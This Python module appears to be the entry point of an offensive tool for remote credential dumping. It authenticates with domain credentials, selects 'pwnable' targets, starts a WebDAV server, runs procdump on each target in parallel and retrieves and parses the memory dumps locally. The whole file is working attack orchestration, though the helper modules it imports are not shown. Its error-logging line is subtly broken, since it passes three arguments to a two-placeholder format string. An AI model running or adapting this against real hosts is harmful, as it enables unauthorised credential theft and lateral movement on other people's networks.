# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging
from core.User import *
from core.DavServer import *
from core.Resources import *
from core.Targets import *
from core.SprayLove import *
from core.ParseDump import *
from core.Colors import *
from multiprocessing import Process, Queue


def run(args):
	davServer = None
	jobs = []
	user = User(args.domain, args.username, args.password)
	q = Queue()
	davServer = Process(target=launchDavServer, args=(q,))

	try:
		targets = listPwnableTargets(args.targets, user)
		davServer.start()

		if q.get() == 0:
			logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s." % (warningGre, green, white))
			for target in targets:
				jobs.append(Process(target=sprayLove, args=(user, target, args.methods, args.share)))
				jobs[-1].start()

			joinThreads(davServer, jobs, args.wait)
			parseDumps(dumpDir)

	except Exception as e:
		logging.warning("%sError: %s" % (warningRed, white, e))
	finally:
		exit_gracefully(davServer, jobs)